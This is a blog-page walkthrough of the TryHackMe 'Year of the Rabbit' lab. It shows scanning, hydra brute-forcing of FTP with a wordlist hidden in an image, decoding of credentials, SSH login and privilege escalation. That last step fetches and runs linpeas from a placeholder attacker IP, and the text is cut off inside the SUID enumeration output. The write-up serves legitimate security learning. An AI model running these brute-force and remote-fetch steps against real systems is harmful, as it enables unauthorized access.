<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="TryHackMe - Year Of The Rabbit - WRITE-UP" /><meta property="og:locale" content="en" /><meta name="description" content="BOX NAME: Year of The Rabbit NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98 ``` bash $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:13 UTC Nmap scan report for 10.10.100.98 Host is up (0.042s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="BOX NAME: Year of The Rabbit NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98 ``` bash $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:13 UTC Nmap scan report for 10.10.100.98 Host is up (0.042s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/" /><meta property="og:url" content="https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/" /><meta property="og:site_name" content="Cloufish’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-18T08:46:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe - Year Of The Rabbit - WRITE-UP" /><meta name="twitter:site" content="@Cloufisz" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"BOX NAME: Year of The Rabbit NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98 ``` bash $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:13 UTC Nmap scan report for 10.10.100.98 Host is up (0.042s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel","url":"https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/","@type":"BlogPosting","headline":"TryHackMe - Year Of The Rabbit - WRITE-UP","dateModified":"2021-06-11T19:18:37+02:00","datePublished":"2021-02-18T08:46:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/"},"@context":"https://schema.org"}</script><title>TryHackMe - Year Of The Rabbit - WRITE-UP | Cloufish's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cloufish's Blog"><meta name="application-name" content="Cloufish's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">Cloufish's Blog</a></div><div class="site-subtitle font-italic">My own internet corner :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/blog/resources/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES TO LEARN HACKING</span> </a><li class="nav-item"> <a href="/blog/contribute/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>HELP ME WITH GITHUB PROJECTS</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Cloufish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Cloufisz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cloufisz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Posts </a> </span> <span>TryHackMe - Year Of The Rabbit - WRITE-UP</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe - Year Of The Rabbit - WRITE-UP</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Bartholomew Mokrzycki </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Feb 18, 2021, 8:46 AM +0100" prep="on" > Feb 18 <i class="unloaded">2021-02-18T08:46:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 11, 2021, 7:18 PM +0200" prefix="Updated " > Jun 11 <i class="unloaded">2021-06-11T19:18:37+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1799 words">9 min</span></div></div><div class="post-content"><h2 id="box-name-year-of-the-rabbit">BOX NAME: <a href="https://tryhackme.com/room/yearoftherabbit">Year of The Rabbit</a></h2><h3 id="nmap">NMAP</h3><p><code class="language-plaintext highlighter-rouge">$ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>@
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-22 08:13 UTC
Nmap scan report <span class="k">for </span>10.10.100.98
Host is up <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 <span class="nb">df</span>:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f <span class="o">(</span>RSA<span class="o">)</span>
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.83 seconds
</pre></table></code></div></div><p>We see that there’s ssh, ftp open and that there’s Apache webapp hosted. Let’s check out webapplication:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/cfHaaIO.png" alt="Main-Page" /><br /> Let’s run gobuster to find other directories</p><h3 id="gobuster">GOBUSTER</h3><p><code class="language-plaintext highlighter-rouge">$ gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.100.98 -o /home/penelope/Pentesting/CTFs/THM/Year_Of_The_Rabbit/command_output//gobuster.txt</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>/assets <span class="o">(</span>Status: 200<span class="o">)</span>
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
 
<span class="o">===============================================================</span>
2021/01/22 08:19:30 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><h3 id="exploring-directories">Exploring directories</h3><p>The one that catches my eye is /assets, in there we see: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/0AUIBr8.png" alt="/assets" /></p><p>A RickRolled video?!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/dG7qE4b.png" alt="RickRolled" /></p><p>In this video we hear that there’s nothing important in this video and we should check somewhere else… I’m going to trust the author on that… xD<br /> But this video was not the only one in /assets. We see another file called style.css</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/YsoueSA.png" alt="style.css" /> There we’ll see a secret directory, and heading to this directory we’ll get an alert:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/BzQ2Hq7.png" alt="alert" /> Thankfully turning off javascript is extremely easy, it is built-in option in your browser’s settings:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/lE7Ypcm.png" alt="javascript" /> So let’s change that to Disallowed and then head to the directory again.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/hsqyOay.png" alt="secret-tip" /></p><p>Rick again?! So are we stuck…? So I’ve said before that the video instructed us that we’re looking in the wrong place… But what are the other places??? In the video the ivona <strong>burps</strong>. This is definetely a hint to use a Burp Suite.<br /> I personally don’t like using Burp to just see the request headers. We’ll use Chrome DevTools instead!:</p><ol><li>Let’s open DevTools, and head up to Network tab<li>Then from the main-page go to the secret directory.<li>I see that there’s one peculiar request redirecting us</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/wpWB4ri.png" alt="weird-request" /></p><p>It looks like it’s requesting some hidden directory… Let’s check it too.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/WPKg1mE.png" alt="hidden-directory" /> So let’s see this image. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/f1G2y7w.png" alt="image" /> It looks like we can’t get any info from it. But there may be other data embedded in this image. Let’s download it and run <code class="language-plaintext highlighter-rouge">strings</code> on it!</p><p><code class="language-plaintext highlighter-rouge">strings Hot_Babe.png</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre>Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&amp;Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&amp;
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&amp;
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&amp;=0Z
nR8&amp;FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&amp;GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&amp;AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&amp;^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&amp;*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&amp;bNl3#&amp;l
zLH%Ot0Bw&amp;c%9
</pre></table></code></div></div><h3 id="ftp-brute-forcing">FTP Brute-Forcing</h3><p>So it looks like we need to brute-force ftp server with this wordlist listed here. Let’s copy this wordlist to another file and then use <code class="language-plaintext highlighter-rouge">hydra</code> to brute-force</p><p><code class="language-plaintext highlighter-rouge">hydra -l ftpuser -P wordlist.txt ftp://10.10.100.98/</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-22 10:36:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.100.98:21/
[21][ftp] host: 10.10.100.98   login: ftpuser   password: 5iez[CUTTED]KKQ
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-22 10:37:17
</pre></table></code></div></div><p>Let’s log in then to this user</p><p><code class="language-plaintext highlighter-rouge">$ ftp 10.10.100.98</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>Connected to 10.10.100.98.
220 (vsFTPd 3.0.2)
Name (10.10.100.98:cloufisz): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp&gt;
</pre></table></code></div></div><p>We see the file <code class="language-plaintext highlighter-rouge">Eli's_Creds.txt</code> We can get this file with command</p><p><code class="language-plaintext highlighter-rouge">get Eli's_Creds.txt</code> – inside ftp session</p><h3 id="strange-codeencoding">Strange code/encoding</h3><p>When viewing this file, we see</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ +.&lt;++ +[-&gt;-
--&lt;]&gt; ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- --.&lt;+
++++[ -&gt;--- --&lt;]&gt; -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ .++++ +++.- --.&lt;+
+++++ +++[- &gt;---- ----- &lt;]&gt;-- ----- ----. ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
]&gt;+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.. ++++. ----- ---.+
++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.&lt;+ ++++[ -&gt;---
--&lt;]&gt; -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ +.&lt;++ +++[- &gt;++++
+&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;+.&lt;+
++++[ -&gt;--- --&lt;]&gt; ---.&lt; +++++ [-&gt;-- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++
&lt;]&gt;++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- -.+++ +.&lt;++ +++++ [-&gt;++ +++++
&lt;]&gt;+. &lt;+++[ -&gt;--- &lt;]&gt;-- ---.- ----. &lt;
</pre></table></code></div></div><p>It looks like some code… reminds me of cipher code. By googling just a tiny piece of this message, we see that it is…</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/R8Pc61w.png" alt="googling" /> A fancy way of encoding message, and there’s even decryptor, let’s use it</p><p>With decrypting it <strong>we get eli’s credentials</strong> probably to ssh</p><p>log in with <code class="language-plaintext highlighter-rouge">ssh eli@10.10.100.98</code> and input her/his password</p><h3 id="privilege-escalation-horizontal">Privilege Escalation Horizontal</h3><p>In her /home directory we see basic directories like Pictures, Videos, Music etc. It seems there’s no flag straight up<br /> I’m going to expect that the user flag is located in some <code class="language-plaintext highlighter-rouge">user.txt</code> file. I’ll find it with <code class="language-plaintext highlighter-rouge">find</code> command</p><p><code class="language-plaintext highlighter-rouge">find / -type f -name 'user.txt' 2&gt; /dev/null</code><br /> We find that it’s located in <code class="language-plaintext highlighter-rouge">/home/gwendoline/user.txt</code> so it’s completely different user!<br /> I’m stuck again… after one hour and logging again to ssh I’ve noticed that there’s <strong>ssh banner</strong> that is definetely not the default one!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

</pre></table></code></div></div><p>We can find it again - using <code class="language-plaintext highlighter-rouge">find</code> But I’ll doing it with <code class="language-plaintext highlighter-rouge">locate</code> now</p><p><code class="language-plaintext highlighter-rouge">$ locate s3cr3t</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
</pre></table></code></div></div><p>So we see that there’s even hidden file with message. Reading it we get <strong>password for the gwendoline user</strong><br /> <strong>In his /home directory we see user.txt flag</strong></p><h3 id="privilege-escalation-vertical">Privilege Escalation Vertical</h3><p>I’ll be transfering linpeas.sh script for privesc by:</p><p><code class="language-plaintext highlighter-rouge">python -m http.server 8080</code> where you have linpeas.sh located.<br /> I want to wget get this file to /tmp directory, so I’ll cd into that<br /> <code class="language-plaintext highlighter-rouge">cd /tmp</code></p><p><code class="language-plaintext highlighter-rouge">wget http://&lt;YOUR_THM_IP&gt;:8080/linpeas.sh</code><br /> <code class="language-plaintext highlighter-rouge">chmod +x linpeas.sh</code><br /> <code class="language-plaintext highlighter-rouge">./linpeas.sh </code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root   root       9.9K Feb 24  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root   root       9.9K Apr  1  2014 /usr/bin/X
-rwsr-sr-x 1 daemon daemon      55K Sep 30  2014 /usr/bin/at  ---&gt;  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root   root       143K Oct  5  2014 /bin/ntfs-3g  ---&gt;  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root   root        14K Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root   root        31K Nov  8  2014 /bin/fusermount
-rwsr-xr-x 1 root   root        74K Nov 20  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        44K Nov 20  2014 /usr/bin/chsh
-rwsr-xr-x 1 root   root        53K Nov 20  2014 /usr/bin/chfn  ---&gt;  SuSE_9.3/10
-rwsr-xr-x 1 root   root        39K Nov 20  2014 /usr/bin/newgrp  ---&gt;  HP-UX_10.20
-rwsr-xr-x 1 root   root        40K Nov 20  2014 /bin/su
-rwsr-xr-x 1 root   root        15K Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root        23K Nov 28  2014 /usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-- 1 root   messagebus 288K Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root   mail        88K Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root   root        11K Feb 13  2015 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root   root       3.0M Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-x 1 root   root       147K Mar 12  2015 /usr/bin/sudo  ---&gt;  /sudo$
-rwsr-xr-x 1 root   root       455K Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        27K Mar 29  2015 /bin/umount  ---&gt;  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root        40K Mar 29  2015 /bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
